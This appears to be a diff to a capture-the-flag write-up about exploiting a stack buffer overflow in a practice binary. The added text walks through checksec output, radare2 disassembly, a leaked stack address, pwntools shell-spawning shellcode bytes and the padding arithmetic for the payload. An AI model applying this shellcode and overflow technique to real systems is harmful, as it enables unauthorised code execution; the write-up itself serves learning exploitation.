@@ -4,7 +4,7 @@
 
 ##### Disassembling
 
-First we run ```checksec --file=a.out``` to see any vulnerabilities and see there is ```No canary found``` and NX disabled which means we can implant shellcode. 
+First we run ```checksec --file=a.out``` to see any vulnerabilities and see there is ```No canary found``` and ```NX disabled``` which means we can implant shellcode. 
 
 Then we run ```r2 -Ad a.out``` to disassemble the file in debug mode and then enter ```s main``` to be taken to main and ```Vp``` to open visual.
 
@@ -41,3 +41,6 @@ Then we run ```r2 -Ad a.out``` to disassemble the file in debug mode and then en
 └           0x5624af44e1ee      c3             ret                                                                                 
             0x5624af44e1ef      90             nop 
 ```
+
+We notice that the space we're looking for is ```0x140``` which translates to ```320```
+When we run the executable it gives us the leak address which is ```0x7fffdcbfafb0``` so since its a 64bit executable we can ```p64(int(0x7fffdcbfafb0))``` which gives us ```b'\xb0\xaf\xbf\xdc\xff\x7f\x00\x00'```. We can then tell our machine that the executable is 64bits with ```context.arch = "amd64"``` and then ```asm(shellcraft.amd64.sh())``` which gives us ```b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'```. We then check the length of the ```shellcraft``` with ```len(outputabove)``` to get ```48```. Now we can craft our payloard with ```payload = outputabove + b'a' * (320 + 8 -48) + p64(int(0x7fffdcbfafb0))```. Send it ```p.sendline(payload)``` and ```p.interactive``` to get shell. 
